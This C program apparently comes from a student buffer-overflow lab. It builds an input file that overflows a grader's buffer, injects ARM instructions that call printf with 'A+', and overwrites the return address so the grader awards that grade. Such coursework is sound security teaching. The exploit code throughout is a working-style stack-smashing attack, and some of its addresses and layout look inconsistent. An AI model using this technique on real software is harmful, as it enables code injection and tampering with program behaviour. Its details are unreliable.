#include <stdio.h>
#include "miniassembler.h"

int main(void) {
    FILE *dataAplus;
    unsigned int payloadAddress, printfAddress;
    unsigned int ldrInstr, blInstr;
    int i = 0;

    /* Open the dataAplus file for writing */
    dataAplus = fopen("dataAplus", "w+");

    /* Write the student name and a null byte, 12 characters */
    fprintf(dataAplus, "Alex & Matt");
    putc('\0', dataAplus);

    /*Addresses need to be adjusted based on actual memory layout */
    printfAddress = 0x400690; 
    payloadAddress = 0x420044; 

    /*Overwrite the return address with our payload address*/
    fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);

    /*Payload: Set up register to point to "A+" string for printf*/
    ldrInstr = MiniAssembler_ldr(0, (unsigned long)"A+"); 
    fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);

    /* Branch to printf with "A+" string */
    blInstr = MiniAssembler_bl(printfAddress, payloadAddress);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);

    /*Branch back to a safe point in the grader after printf*/
    blInstr = MiniAssembler_bl(0x40089c, payloadAddress + 8);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
    
    /*Padding to fill buffer and reach the return address*/
    while(i < 20) {
        putc('A', dataAplus);
        i++;
    }

    /* write BSS address of ldr instruction to file */
    fprintf(dataAplus, "%c", 0x64);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x42);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x00);
   
    /* Close the file*/
    fclose(dataAplus);
    return 0;
}
